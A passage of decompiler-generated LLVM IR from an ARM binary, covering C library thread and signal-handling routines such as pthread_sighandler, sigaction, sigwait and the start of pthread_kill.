  %v2_c2d4 = load i32, i32* @global_var_30238.188, align 4
  store i32 %v2_c2d4, i32* @r2, align 4
  %v3_c2d8 = and i32 %v1_c2a0, -2097152
  %v4_c2d8 = xor i32 %v3_c2d8, -2097152
  %v2_c2e0 = icmp eq i32 %v2_c2d4, 0
  %v1_c2e4 = sub i32 -477, %v4_c2d8
  br i1 %v2_c2e0, label %dec_label_pc_c2f0, label %dec_label_pc_c2ec

dec_label_pc_c2ec:                                ; preds = %bb4
  %v1_c2ec = call i32 @__pthread_find_self(i32 %v1_c2e4)
  br label %dec_label_pc_c2f0

dec_label_pc_c2f0:                                ; preds = %bb4, %dec_label_pc_c2ec
  %v0_c2f0 = phi i32 [ %v1_c2e4, %bb4 ], [ %v1_c2ec, %dec_label_pc_c2ec ]
  %v1_c2f0 = add i32 %v0_c2f0, -3
  ret i32 %v1_c2f0

; uselistorder directives
  uselistorder i32 %v1_c2e4, { 1, 0 }
  uselistorder label %dec_label_pc_c2f0, { 1, 0 }
}

define i32 @pthread_sighandler_rt(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c310 = load i32, i32* @r4, align 4
  store i32 %v3_c310, i32* %stack_var_-20, align 4
  %v16_c310 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* %r7.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v0_c320 = call i32 @_thread_self.1()
  %v1_c324 = add i32 %v0_c320, 88
  %v2_c324 = inttoptr i32 %v1_c324 to i8*
  %v3_c324 = load i8, i8* %v2_c324, align 1
  %v4_c324 = zext i8 %v3_c324 to i32
  store i32 %v4_c324, i32* %r3.global-to-local, align 4
  %v2_c328 = icmp eq i8 %v3_c324, 0
  store i1 %v2_c328, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_c320, i32* %r6.global-to-local, align 4
  br i1 %v2_c328, label %.thread6, label %bb

.thread6:                                         ; preds = %entry
  %v0_c33c3 = load i32, i32* %r7.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_c33c = load i32, i32* %r7.global-to-local, align 4
  %v3_c340 = add i32 %v0_c320, 32
  %v4_c340 = inttoptr i32 %v3_c340 to i32*
  store i32 %v0_c33c, i32* %v4_c340, align 4
  %v1_c344 = load i32, i32* %r3.global-to-local, align 4
  %v2_c344 = trunc i32 %v1_c344 to i8
  %v3_c344 = load i32, i32* %r6.global-to-local, align 4
  %v4_c344 = add i32 %v3_c344, 88
  %v5_c344 = inttoptr i32 %v4_c344 to i8*
  store i8 %v2_c344, i8* %v5_c344, align 1
  %v0_c348.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c348.pr, label %bb..thread5_crit_edge, label %bb13

bb..thread5_crit_edge:                            ; preds = %bb
  %v0_c34c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %.thread5

bb13:                                             ; preds = %bb
  %v3_c348 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_c348, i32* %r4.global-to-local, align 4
  ret i32 %v0_c33c

.thread5:                                         ; preds = %bb..thread5_crit_edge, %.thread6
  %v0_c34c = phi i32 [ %v0_c320, %.thread6 ], [ %v0_c34c.pre, %bb..thread5_crit_edge ]
  %v0_c33c47 = phi i32 [ %v0_c33c3, %.thread6 ], [ %v0_c33c, %bb..thread5_crit_edge ]
  %v1_c34c = add i32 %v0_c34c, 84
  %v2_c34c = inttoptr i32 %v1_c34c to i32*
  %v3_c34c = load i32, i32* %v2_c34c, align 4
  store i32 %v3_c34c, i32* %r4.global-to-local, align 4
  %v2_c350 = icmp eq i32 %v3_c34c, 0
  store i1 %v2_c350, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c350, label %bb14, label %bb15

bb14:                                             ; preds = %.thread5
  store i32 %v16_c310, i32* %v2_c34c, align 4
  br label %bb15

bb15:                                             ; preds = %.thread5, %bb14
  store i32 ptrtoint (i32* @global_var_2bd40.306 to i32), i32* %r3.global-to-local, align 4
  %v1_c360 = load i32, i32* %r7.global-to-local, align 4
  %v4_c360 = mul i32 %v1_c360, 4
  %v5_c360 = add i32 %v4_c360, ptrtoint (i32* @global_var_2bd40.306 to i32)
  %v6_c360 = inttoptr i32 %v5_c360 to i32*
  %v7_c360 = load i32, i32* %v6_c360, align 4
  call void @__pseudo_branch(i32 %v7_c360)
  %v0_c364 = load i32, i32* %r4.global-to-local, align 4
  %v2_c364 = icmp eq i32 %v0_c364, 0
  store i1 %v2_c364, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c364, label %bb16, label %bb17

bb16:                                             ; preds = %bb15
  %v2_c368 = load i32, i32* %r6.global-to-local, align 4
  %v3_c368 = add i32 %v2_c368, 84
  %v4_c368 = inttoptr i32 %v3_c368 to i32*
  store i32 0, i32* %v4_c368, align 4
  br label %bb17

bb17:                                             ; preds = %bb15, %bb16
  %v2_c36c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_c36c, i32* %r4.global-to-local, align 4
  ret i32 %v0_c33c47

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 0, 1, 3, 2 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %bb15, { 1, 0 }
}

define i32 @pthread_sighandler(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %v2_c378 = ptrtoint i32* %stack_var_-116 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg4, i32* %sl.global-to-local, align 4
  %v0_c38c = call i32 @_thread_self.1()
  %v1_c390 = add i32 %v0_c38c, 88
  %v2_c390 = inttoptr i32 %v1_c390 to i8*
  %v3_c390 = load i8, i8* %v2_c390, align 1
  %v4_c390 = zext i8 %v3_c390 to i32
  store i32 %v4_c390, i32* %r3.global-to-local, align 4
  %v2_c394 = icmp eq i8 %v3_c390, 0
  store i1 %v2_c394, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_c38c, i32* @r5, align 4
  br i1 %v2_c394, label %.thread8, label %.thread3

.thread8:                                         ; preds = %entry
  store i32 %v2_c378, i32* @r0, align 4
  %v2_c3a41 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v2_c3a41, i32* @r1, align 4
  store i32 88, i32* @r2, align 4
  br label %dec_label_pc_c3b8

.thread3:                                         ; preds = %entry
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_c378, i32* @r0, align 4
  %v2_c3a4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v2_c3a4, i32* @r1, align 4
  store i32 88, i32* @r2, align 4
  %v1_c3ac = load i32, i32* %r6.global-to-local, align 4
  %v3_c3ac = add i32 %v0_c38c, 32
  %v4_c3ac = inttoptr i32 %v3_c3ac to i32*
  store i32 %v1_c3ac, i32* %v4_c3ac, align 4
  %v1_c3b0 = load i32, i32* %r3.global-to-local, align 4
  %v2_c3b0 = trunc i32 %v1_c3b0 to i8
  %v3_c3b0 = load i32, i32* @r5, align 4
  %v4_c3b0 = add i32 %v3_c3b0, 88
  %v5_c3b0 = inttoptr i32 %v4_c3b0 to i8*
  store i8 %v2_c3b0, i8* %v5_c3b0, align 1
  %v0_c3b4.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c3b4.pr.pr, label %.thread3.dec_label_pc_c3b8_crit_edge, label %bb20

.thread3.dec_label_pc_c3b8_crit_edge:             ; preds = %.thread3
  %v0_c3b8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c3b8

dec_label_pc_c3b8:                                ; preds = %.thread3.dec_label_pc_c3b8_crit_edge, %.thread8
  %v0_c3b8 = phi i32 [ %v0_c38c, %.thread8 ], [ %v0_c3b8.pre, %.thread3.dec_label_pc_c3b8_crit_edge ]
  %v1_c3b8 = add i32 %v0_c3b8, 84
  %v2_c3b8 = inttoptr i32 %v1_c3b8 to i32*
  %v3_c3b8 = load i32, i32* %v2_c3b8, align 4
  store i32 %v3_c3b8, i32* @r4, align 4
  %v2_c3bc = icmp eq i32 %v3_c3b8, 0
  store i1 %v2_c3bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c3bc, label %bb, label %bb18

bb:                                               ; preds = %dec_label_pc_c3b8
  store i32 %v2_c378, i32* %v2_c3b8, align 4
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_c3b8, %bb
  %v0_c3c4 = call i32 @memcpy()
  %v0_c3c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_c3c8, i32* @r0, align 4
  %v0_c3d4 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_c3d4, i32* %r3.global-to-local, align 4
  %v4_c3e0 = mul i32 %v0_c3c8, 4
  %v5_c3e0 = add i32 %v4_c3e0, ptrtoint (i32* @global_var_2bd40.306 to i32)
  %v6_c3e0 = inttoptr i32 %v5_c3e0 to i32*
  %v7_c3e0 = load i32, i32* %v6_c3e0, align 4
  call void @__pseudo_branch(i32 %v7_c3e0)
  %v0_c3e4 = load i32, i32* @r4, align 4
  %v2_c3e4 = icmp eq i32 %v0_c3e4, 0
  store i1 %v2_c3e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c3e4, label %bb19, label %bb20

bb19:                                             ; preds = %bb18
  %v2_c3e8 = load i32, i32* @r5, align 4
  %v3_c3e8 = add i32 %v2_c3e8, 84
  %v4_c3e8 = inttoptr i32 %v3_c3e8 to i32*
  store i32 0, i32* %v4_c3e8, align 4
  br label %bb20

bb20:                                             ; preds = %.thread3, %bb18, %bb19
  %v23_c3f0 = load i32, i32* @r0, align 4
  ret i32 %v23_c3f0

; uselistorder directives
  uselistorder i32 %v2_c378, { 1, 2, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder label %bb20, { 2, 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @__GI_sigaction(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-160 = alloca i32, align 4
  %v3_c3f8 = load i32, i32* @r4, align 4
  %v6_c3f8 = load i32, i32* @r5, align 4
  %v9_c3f8 = load i32, i32* @r6, align 4
  %v2_c400 = load i32, i32* @global_var_2b488.309, align 4
  %v0_c404 = load i32, i32* %r0.global-to-local, align 4
  %v9_c404 = icmp eq i32 %v0_c404, %v2_c400
  %v2_c408 = ptrtoint i32* %stack_var_-160 to i32
  store i32 %v0_c404, i32* @r4, align 4
  store i32 %arg3, i32* %r7.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  br i1 %v9_c404, label %dec_label_pc_c4fc, label %dec_label_pc_c41c

dec_label_pc_c41c:                                ; preds = %entry
  %v2_c420 = load i32, i32* @global_var_2b48c.226, align 4
  %v9_c424 = icmp eq i32 %v0_c404, %v2_c420
  br i1 %v9_c424, label %dec_label_pc_c4fc, label %dec_label_pc_c42c

dec_label_pc_c42c:                                ; preds = %dec_label_pc_c41c
  %v2_c430 = load i32, i32* @global_var_2b490.204, align 4
  %v9_c434 = icmp eq i32 %v0_c404, %v2_c430
  br i1 %v9_c434, label %dec_label_pc_c43c, label %dec_label_pc_c444

dec_label_pc_c43c:                                ; preds = %dec_label_pc_c42c
  %v5_c440 = icmp sgt i32 %v0_c404, 0
  br i1 %v5_c440, label %dec_label_pc_c4fc, label %dec_label_pc_c444

dec_label_pc_c444:                                ; preds = %dec_label_pc_c42c, %dec_label_pc_c43c
  %v2_c444 = icmp eq i32* %arg2, null
  br i1 %v2_c444, label %bb, label %dec_label_pc_c450

bb:                                               ; preds = %dec_label_pc_c444
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4ac

dec_label_pc_c450:                                ; preds = %dec_label_pc_c444
  store i32 %v2_c408, i32* @r0, align 4
  store i32 140, i32* @r2, align 4
  %v0_c45c = call i32 @memcpy()
  store i32 %v0_c45c, i32* %r0.global-to-local, align 4
  %v0_c460 = load i32, i32* @r5, align 4
  %v1_c460 = inttoptr i32 %v0_c460 to i32*
  %v2_c460 = load i32, i32* %v1_c460, align 4
  %v2_c464 = icmp ne i32 %v2_c460, 0
  %v7_c464 = icmp eq i32 %v2_c460, 1
  %v2_c468 = xor i1 %v2_c464, true
  %v3_c468 = or i1 %v7_c464, %v2_c468
  br i1 %v3_c468, label %bb28, label %bb29

bb28:                                             ; preds = %dec_label_pc_c450
  br label %bb29

bb29:                                             ; preds = %dec_label_pc_c450, %bb28
  %v0_c478.pr11 = phi i32 [ %v2_c460, %dec_label_pc_c450 ], [ 0, %bb28 ]
  %v2_c46c = xor i1 %v7_c464, true
  %v3_c46c = and i1 %v2_c464, %v2_c46c
  br i1 %v3_c46c, label %bb30, label %bb31

bb30:                                             ; preds = %bb29
  br label %bb31

bb31:                                             ; preds = %bb29, %bb30
  %v0_c478.pr = phi i32 [ %v0_c478.pr11, %bb29 ], [ 1, %bb30 ]
  %v0_c470 = load i32, i32* @r4, align 4
  %tmp32 = icmp slt i32 %v0_c470, 1
  br i1 %tmp32, label %.thread1, label %bb33

.thread1:                                         ; preds = %bb31
  br label %dec_label_pc_c4a8

bb33:                                             ; preds = %bb31
  %v2_c478 = icmp eq i32 %v0_c478.pr, 0
  br i1 %v2_c478, label %dec_label_pc_c4a8, label %dec_label_pc_c480

dec_label_pc_c480:                                ; preds = %bb33
  %v8_c484 = icmp sgt i32 %v0_c470, 64
  br i1 %v8_c484, label %dec_label_pc_c4a8, label %dec_label_pc_c488

dec_label_pc_c488:                                ; preds = %dec_label_pc_c480
  %v1_c488 = add i32 %v0_c460, 132
  %v2_c488 = inttoptr i32 %v1_c488 to i32*
  %v3_c488 = load i32, i32* %v2_c488, align 4
  %v1_c48c = and i32 %v3_c488, 4
  %v2_c48c = icmp eq i32 %v1_c48c, 0
  %. = select i1 %v2_c48c, i32 ptrtoint (i32* @global_var_c374.315 to i32), i32 ptrtoint (i32* @global_var_c310.313 to i32)
  store i32 %v2_c408, i32* %r0.global-to-local, align 4
  store i32 %., i32* %stack_var_-160, align 4
  br label %dec_label_pc_c4ac

dec_label_pc_c4a8:                                ; preds = %.thread1, %dec_label_pc_c480, %bb33
  store i32 %v2_c408, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c4ac

dec_label_pc_c4ac:                                ; preds = %bb, %dec_label_pc_c488, %dec_label_pc_c4a8
  %v0_c4b4 = phi i32 [ %v0_c404, %bb ], [ %v0_c470, %dec_label_pc_c488 ], [ %v0_c470, %dec_label_pc_c4a8 ]
  %v0_c4ac = phi i32 [ 0, %bb ], [ %v2_c408, %dec_label_pc_c488 ], [ %v2_c408, %dec_label_pc_c4a8 ]
  %v0_c4b0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_c4b4, i32* %r0.global-to-local, align 4
  %v3_c4b8 = inttoptr i32 %v0_c4ac to i32*
  %v4_c4b8 = call i32 @__libc_sigaction(i32 %v0_c4b4, i32* %v3_c4b8, i32 %v0_c4b0)
  store i32 %v4_c4b8, i32* %r0.global-to-local, align 4
  %v7_c4bc = icmp eq i32 %v4_c4b8, -1
  br i1 %v7_c4bc, label %dec_label_pc_c508, label %dec_label_pc_c4c4

dec_label_pc_c4c4:                                ; preds = %dec_label_pc_c4ac
  %v0_c4c4 = load i32, i32* @r4, align 4
  %v1_c4c4 = add i32 %v0_c4c4, -1
  %tmp37 = icmp ugt i32 %v1_c4c4, 63
  br i1 %tmp37, label %dec_label_pc_c504, label %dec_label_pc_c4d0

dec_label_pc_c4d0:                                ; preds = %dec_label_pc_c4c4
  %v0_c4d0 = load i32, i32* %r7.global-to-local, align 4
  %v2_c4d0 = icmp eq i32 %v0_c4d0, 0
  br i1 %v2_c4d0, label %.thread9, label %bb36

bb36:                                             ; preds = %dec_label_pc_c4d0
  %v5_c4d8 = mul i32 %v0_c4c4, 4
  %v6_c4d8 = add i32 %v5_c4d8, ptrtoint (i32* @global_var_2bd40.306 to i32)
  %v7_c4d8 = inttoptr i32 %v6_c4d8 to i32*
  %v8_c4d8 = load i32, i32* %v7_c4d8, align 4
  %v3_c4dc = inttoptr i32 %v0_c4d0 to i32*
  store i32 %v8_c4d8, i32* %v3_c4dc, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_c4d0, %bb36
  %v0_c4e0 = load i32, i32* @r5, align 4
  %v2_c4e0 = icmp eq i32 %v0_c4e0, 0
  br i1 %v2_c4e0, label %dec_label_pc_c504, label %dec_label_pc_c4e8

dec_label_pc_c4e8:                                ; preds = %.thread9
  %v1_c4e8 = inttoptr i32 %v0_c4e0 to i32*
  %v2_c4e8 = load i32, i32* %v1_c4e8, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_c4f4 = load i32, i32* @r4, align 4
  %v5_c4f4 = mul i32 %v2_c4f4, 4
  %v6_c4f4 = add i32 %v5_c4f4, ptrtoint (i32* @global_var_2bd40.306 to i32)
  %v7_c4f4 = inttoptr i32 %v6_c4f4 to i32*
  store i32 %v2_c4e8, i32* %v7_c4f4, align 4
  %v17_c50c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c508

dec_label_pc_c4fc:                                ; preds = %dec_label_pc_c43c, %dec_label_pc_c41c, %entry
  store i32 22, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c508

dec_label_pc_c504:                                ; preds = %.thread9, %dec_label_pc_c4c4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c508

dec_label_pc_c508:                                ; preds = %dec_label_pc_c4ac, %dec_label_pc_c4fc, %dec_label_pc_c4e8, %dec_label_pc_c504
  %v17_c50c = phi i32 [ %v4_c4b8, %dec_label_pc_c4ac ], [ 22, %dec_label_pc_c4fc ], [ %v17_c50c.pre, %dec_label_pc_c4e8 ], [ 0, %dec_label_pc_c504 ]
  store i32 %v3_c3f8, i32* @r4, align 4
  store i32 %v6_c3f8, i32* @r5, align 4
  store i32 %v9_c3f8, i32* @r6, align 4
  ret i32 %v17_c50c

; uselistorder directives
  uselistorder i32 %v4_c4b8, { 1, 0, 2 }
  uselistorder i32 %v0_c4b4, { 1, 0 }
  uselistorder i1 %v2_c464, { 1, 0 }
  uselistorder i32 %v2_c408, { 2, 1, 3, 0, 4 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 8, 6, 7, 11, 10, 9, 0, 1 }
  uselistorder label %dec_label_pc_c508, { 3, 1, 2, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_c4ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c4a8, { 1, 2, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %dec_label_pc_c444, { 1, 0 }
}

define i32 @sigwait(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-504 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-508 = alloca i32, align 4
  %v2_c530 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %tmp, i32* %stack_var_-508, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_c53c = call i32 @_thread_self.1()
  store i32 %v2_c530, i32* @r0, align 4
  %v2_c54c = load i32, i32* @r2, align 4
  %v5_c54c = call i32 @sigfillset(i32 %v2_c530, i32 %tmp, i32 %v2_c54c, i32 %v0_c53c, i32 ptrtoint (i32* @0 to i32))
  store i32 %v2_c530, i32* @r0, align 4
  %v1_c55c = call i32 @__GI_sigdelset(i32 %v2_c530)
  %v2_c5bc = ptrtoint i32* %stack_var_-280 to i32
  br label %dec_label_pc_c5ec

dec_label_pc_c568:                                ; preds = %dec_label_pc_c5ec
  %v2_c568 = call i32 @sigismember(i32 %v0_c5f4, i32 %storemerge)
  %v2_c56c = icmp eq i32 %v2_c568, 0
  br i1 %v2_c56c, label %dec_label_pc_c5e8, label %dec_label_pc_c574

dec_label_pc_c574:                                ; preds = %dec_label_pc_c568
  %v2_c578 = load i32, i32* @global_var_2b488.309, align 4
  %v0_c57c = load i32, i32* @r4, align 4
  %v9_c57c = icmp eq i32 %v0_c57c, %v2_c578
  br i1 %v9_c57c, label %dec_label_pc_c5e8, label %dec_label_pc_c584

dec_label_pc_c584:                                ; preds = %dec_label_pc_c574
  %v2_c588 = load i32, i32* @global_var_2b48c.226, align 4
  %v9_c58c = icmp eq i32 %v0_c57c, %v2_c588
  br i1 %v9_c58c, label %dec_label_pc_c5e8, label %dec_label_pc_c594

dec_label_pc_c594:                                ; preds = %dec_label_pc_c584
  %v2_c598 = load i32, i32* @global_var_2b490.204, align 4
  %v9_c59c = icmp eq i32 %v0_c57c, %v2_c598
  store i32 %v2_c530, i32* @r0, align 4
  br i1 %v9_c59c, label %dec_label_pc_c5e8, label %dec_label_pc_c5ac

dec_label_pc_c5ac:                                ; preds = %dec_label_pc_c594
  %v1_c5ac = call i32 @__GI_sigdelset(i32 %v2_c530)
  %v1_c5b4 = load i32, i32* @r4, align 4
  %v4_c5b4 = mul i32 %v1_c5b4, 4
  %v5_c5b4 = add i32 %v4_c5b4, ptrtoint (i32* @global_var_2bd40.306 to i32)
  %v6_c5b4 = inttoptr i32 %v5_c5b4 to i32*
  %v7_c5b4 = load i32, i32* %v6_c5b4, align 4
  store i32 %v2_c5bc, i32* @r0, align 4
  %v7_c5b4.cmp = icmp ugt i32 %v7_c5b4, 1
  br i1 %v7_c5b4.cmp, label %dec_label_pc_c5e8, label %dec_label_pc_c5c4

dec_label_pc_c5c4:                                ; preds = %dec_label_pc_c5ac
  store i32 ptrtoint (i32* @global_var_c290.322 to i32), i32* %stack_var_-284, align 4
  %v1_c5cc = call i32 @sigemptyset(i32 %v2_c5bc)
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_c5d8 = load i32, i32* @r4, align 4
  %v4_c5e4 = call i32 @__GI_sigaction(i32 %v0_c5d8, i32* nonnull %stack_var_-284, i32 0)
  br label %dec_label_pc_c5e8

dec_label_pc_c5e8:                                ; preds = %dec_label_pc_c5ac, %dec_label_pc_c594, %dec_label_pc_c584, %dec_label_pc_c574, %dec_label_pc_c568, %dec_label_pc_c5c4
  %v0_c5e8 = load i32, i32* @r4, align 4
  %v1_c5e8 = add i32 %v0_c5e8, 1
  br label %dec_label_pc_c5ec

dec_label_pc_c5ec:                                ; preds = %entry, %dec_label_pc_c5e8
  %storemerge = phi i32 [ 1, %entry ], [ %v1_c5e8, %dec_label_pc_c5e8 ]
  store i32 %storemerge, i32* @r4, align 4
  %v0_c5f4 = load i32, i32* @r5, align 4
  store i32 %v0_c5f4, i32* @r0, align 4
  %v7_c5f8 = icmp sgt i32 %storemerge, 65
  br i1 %v7_c5f8, label %dec_label_pc_c5fc, label %dec_label_pc_c568

dec_label_pc_c5fc:                                ; preds = %dec_label_pc_c5ec
  store i32 1, i32* @r1, align 4
  %v3_c604 = call i32 @__sigsetjmp(i32* nonnull %stack_var_-504, i32 1)
  %v2_c608 = icmp eq i32 %v3_c604, 0
  br i1 %v2_c608, label %dec_label_pc_c610, label %dec_label_pc_c5fc.dec_label_pc_c658_crit_edge

dec_label_pc_c5fc.dec_label_pc_c658_crit_edge:    ; preds = %dec_label_pc_c5fc
  %.pre = add i32 %v0_c53c, 40
  %.pre1 = inttoptr i32 %.pre to i32*
  br label %dec_label_pc_c658

dec_label_pc_c610:                                ; preds = %dec_label_pc_c5fc
  %v2_c5fc = ptrtoint i32* %stack_var_-504 to i32
  store i32 %v0_c53c, i32* %r2.global-to-local, align 4
  %v1_c618 = add i32 %v0_c53c, 66
  %v2_c618 = inttoptr i32 %v1_c618 to i8*
  %v3_c618 = load i8, i8* %v2_c618, align 1
  %v2_c61c = icmp eq i8 %v3_c618, 0
  %v2_c624 = add i32 %v0_c53c, 40
  %v3_c624 = inttoptr i32 %v2_c624 to i32*
  store i32 %v2_c5fc, i32* %v3_c624, align 4
  br i1 %v2_c61c, label %dec_label_pc_c63c, label %dec_label_pc_c62c

dec_label_pc_c62c:                                ; preds = %dec_label_pc_c610
  %v1_c630 = add i32 %v0_c53c, 64
  %v2_c630 = inttoptr i32 %v1_c630 to i8*
  %v3_c630 = load i8, i8* %v2_c630, align 1
  %v2_c634 = icmp eq i8 %v3_c630, 0
  br i1 %v2_c634, label %dec_label_pc_c658, label %dec_label_pc_c63c

dec_label_pc_c63c:                                ; preds = %dec_label_pc_c62c, %dec_label_pc_c610
  store i32 %v0_c53c, i32* %r2.global-to-local, align 4
  %v2_c644 = add i32 %v0_c53c, 32
  %v3_c644 = inttoptr i32 %v2_c644 to i32*
  store i32 0, i32* %v3_c644, align 4
  %v2_c64c = load i32, i32* %r2.global-to-local, align 4
  %v3_c64c = add i32 %v2_c64c, 88
  %v4_c64c = inttoptr i32 %v3_c64c to i8*
  store i8 1, i8* %v4_c64c, align 1
  %v1_c654 = bitcast i32* %stack_var_-144 to %_TYPEDEF_sigset_t*
  %v2_c654 = call i32 @__libc_sigsuspend(%_TYPEDEF_sigset_t* %v1_c654)
  br label %dec_label_pc_c658

dec_label_pc_c658:                                ; preds = %dec_label_pc_c5fc.dec_label_pc_c658_crit_edge, %dec_label_pc_c62c, %dec_label_pc_c63c
  %v3_c660.pre-phi = phi i32* [ %.pre1, %dec_label_pc_c5fc.dec_label_pc_c658_crit_edge ], [ %v3_c624, %dec_label_pc_c62c ], [ %v3_c624, %dec_label_pc_c63c ]
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %v3_c660.pre-phi, align 4
  %v0_c664 = call i32 @pthread_testcancel()
  %v2_c66c = load i32, i32* %stack_var_-508, align 4
  store i32 %v2_c66c, i32* %r2.global-to-local, align 4
  %v1_c670 = add i32 %v0_c53c, 32
  %v2_c670 = inttoptr i32 %v1_c670 to i32*
  %v3_c670 = load i32, i32* %v2_c670, align 4
  %v0_c674 = load i32, i32* @r4, align 4
  %v2_c678 = inttoptr i32 %v2_c66c to i32*
  store i32 %v3_c670, i32* %v2_c678, align 4
  ret i32 %v0_c674

; uselistorder directives
  uselistorder i32 %v0_c5f4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_c53c, { 3, 5, 4, 2, 1, 7, 6, 0, 8 }
  uselistorder i32 %v2_c530, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32* %stack_var_-504, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_2bd40.306 to i32), { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @sigfillset, { 1, 0 }
  uselistorder i32 ()* @_thread_self.1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_c658, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c5ec, { 1, 0 }
  uselistorder label %dec_label_pc_c5e8, { 5, 0, 1, 2, 3, 4 }
}

define i32 @pthread_kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_c6a0 = urem i32 %arg1, 1024
  %v3_c6a4 = load i32, i32* @r4, align 4
  store i32 %v3_c6a4, i32* %stack_var_-20, align 4
  %v4_c6a8 = mul nuw nsw i32 %v3_c6a0, 16
  %v5_c6a8 = add i32 %v4_c6a8, ptrtoint (i32* @global_var_270a0.207 to i32)
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_c6bc = call i32 @__pthread_lock(i32 %v5_c6a8, i32 0)
  %v1_c6c0 = add i32 %v4_c6a8, add (i32 ptrtoint (i32* @global_var_270a0.207 to i32), i32 8)
  %v2_c6c0 = inttoptr i32 %v1_c6c0 to i32*
  %v3_c6c0 = load i32, i32* %v2_c6c0, align 4
  %v2_c6c4 = icmp eq i32 %v3_c6c0, 0
  br i1 %v2_c6c4, label %dec_label_pc_c6e4, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %entry
  %v1_c6d0 = add i32 %v3_c6c0, 16
  %v2_c6d0 = inttoptr i32 %v1_c6d0 to i32*
  %v3_c6d0 = load i32, i32* %v2_c6d0, align 4
  %v1_c6d4 = load i32, i32* %r4.global-to-local, align 4
  %v2_c6d4 = sub i32 %v3_c6d0, %v1_c6d4
  store i32 %v2_c6d4, i32* %r6.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v3_c6d0, %v1_c6d4
  br i1 %v9_c6d4, label %bb, label %.thread

.thread:                                          ; preds = %dec_label_pc_c6d0
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_c6e4

bb:                                               ; preds = %dec_label_pc_c6d0
  %v2_c6dc = icmp eq i32 %v2_c6d4, 0
